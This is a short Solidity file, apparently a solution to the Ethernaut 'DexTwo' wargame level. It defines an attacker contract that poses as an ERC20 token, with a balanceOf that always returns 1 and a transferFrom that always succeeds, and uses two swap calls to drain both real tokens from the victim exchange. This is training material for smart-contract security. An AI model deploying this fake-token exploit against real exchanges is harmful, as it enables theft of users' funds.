// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../23-DexTwo.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract DexTwoAttacker {
    DexTwo victim;
    address tokenInstance;
    address tokenInstanceTwo;
    address owner;

    constructor(
        address _victimContract,
        address _tokenInstance,
        address _tokenInstanceTwo
    ) {
        victim = DexTwo(_victimContract);
        tokenInstance = _tokenInstance;
        tokenInstanceTwo = _tokenInstanceTwo;
        owner = msg.sender;
    }

    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool) {
        return true;
    }

    function attack() external {
        victim.swap(address(this), tokenInstance, 1);
        victim.swap(address(this), tokenInstanceTwo, 1);
    }
}
